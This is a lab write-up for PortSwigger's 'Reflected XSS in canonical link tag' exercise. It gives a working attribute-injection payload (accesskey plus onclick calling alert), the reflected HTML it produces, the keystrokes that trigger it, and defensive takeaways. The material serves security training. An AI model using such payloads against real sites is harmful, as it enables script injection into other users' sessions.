# Reflected XSS in canonical link tag

## Metadata

| Property | Value |
|----------|-------|

---

### Target Goal - 

Perform an XSS attack on the homepage that injects an attribute that calls the alert function

### Analysyis/Exploitation

**View source page:**

![](https://raw.githubusercontent.com/ExploitResearch/PortSwigger-Labs/main/images/92eccbf237d5_001.png)

In here, we can see that there is a `<link>` tag is using **canonical** link tag.

**To exploit it, we can try to inject **`accesskey`** attribute with an **`onclick`** event:**

`/?'accesskey='x'onclick='alert(document.domain)`

**Result:**

`<link rel="canonical" href='https://0a2200b504a6441cc040ccd100c20002.web-security-academy.net/?'accesskey='x'onclick='alert(document.domain)'/>`

**Now press:**

- On Windows: `Alt + Shift + x`
- On MacOS: `Ctrl + Alt + x`
- On Linux: `Alt + x`

### Why It Works

The exploit succeeds because this lab reflects user input in a canonical link tag and escapes angle brackets.

The official solution confirms: Visit the following URL, replacing YOUR-LAB-ID with your lab ID: https://YOUR-LAB-ID.web-security-academy.net/?%27accesskey=%27x%27onclick=%27alert(1)

The root cause is a failure in the application's security architecture specific to this cross site scripting scenario — the server does not properly validate or secure the user-controlled input that reaches the vulnerable operation.

### Key Takeaways

- The vulnerability is exploitable because user input reaches a sensitive operation without adequate server-side validation.
- PortSwigger confirms: "This lab reflects user input in a canonical link tag and escapes angle brackets."
- Context-aware output encoding is the primary defense — the correct encoding depends on where input is reflected.

## PortSwigger Lab

**Official lab:** Reflected XSS in canonical link tag

**PortSwigger:** https://portswigger.net/web-security/cross-site-scripting/contexts/lab-canonical-link-tag
